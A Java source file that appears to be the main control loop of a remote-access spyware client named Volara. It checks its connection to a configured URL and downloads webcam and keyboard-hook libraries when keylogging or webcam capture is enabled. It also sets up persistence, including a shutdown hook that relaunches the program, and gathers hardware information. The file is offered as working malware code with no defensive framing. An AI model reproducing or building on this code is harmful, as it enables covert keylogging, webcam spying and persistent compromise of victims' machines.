package com.Volara;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.util.TimerTask;

/**
 * Created by Kevin on 5/10/2017.
 */
class loop extends TimerTask {
    public void run() {
        if (global.loopStatus == "notConnected"){
            global.connTest(global.connURL);
            if (global.webConn == true){
                global.loopStatus = "checkLibs";
            }
        }else if (global.loopStatus == "checkLibs") {
            if (!global.fileExists(global.prepareLocation + File.separator + "lib" + File.separator + "vosi.jar")) {
                global.getHardwareLibs();
            } else {
                if (profile.webcam == true && !global.fileExists(global.prepareLocation + File.separator + "lib" + File.separator + "wcj-core.jar")) {
                    global.getWebcamLibs();
                }
                if (profile.keylog == true && !global.fileExists(global.prepareLocation + File.separator + "lib" + File.separator + "jsh.jar")) {
                    global.getSysHookLibs();
                }
                global.loopStatus = "setup";
            }
        }else if (global.loopStatus == "setup"){

            //Persistant
            if (profile.persistant == true){
                try {
                    global.getPersistance();
                } catch (Exception e) {
                    debug.addLine("ERROR: IO - Generate Data:" + e.toString() + "\n", Color.red, 12, false);
                }
                try {
                    global.generatePersistance();
                } catch (Exception e) {
                    debug.addLine("ERROR: IO - Generate Data:" + e.toString() + "\n", Color.red, 12, false);
                }
                global.launchPersistance();
                aim.createRun();
                aim.readRunFile();
                if (!aim.registerInstance()) {
                    // instance already running.
                    System.out.println("Another instance of this application is already running. Exiting.");
                    System.exit(0);
                }
                aim.setApplicationInstanceListener(new aim.ApplicationInstanceListener() {
                    public void newInstanceCreated() {
                        System.out.println("New instance detected...");
                        // this is where your handler code goes...
                    }
                });
                Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
                    public void run() {
                        // save state before exiting and start again
                        try {
                            int status = global.execPersistant(Main.class);
                            System.exit(1);
                        } catch (IOException e) {
                            e.printStackTrace();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                    }
                }, "Shutdown-thread"));
            }//END Persistantance
            global.loopStatus = "runSysInfo";
        }else if (global.loopStatus == "runSysInfo"){
            if (profile.hardware == true){
                sysInfo.Run();
            }
            global.loopStatus = "Idle";
        }else if (global.loopStatus == "Idle"){
            debug.addLine("Idle...\n", Color.lightGray, 12, false);
        }
    }
}
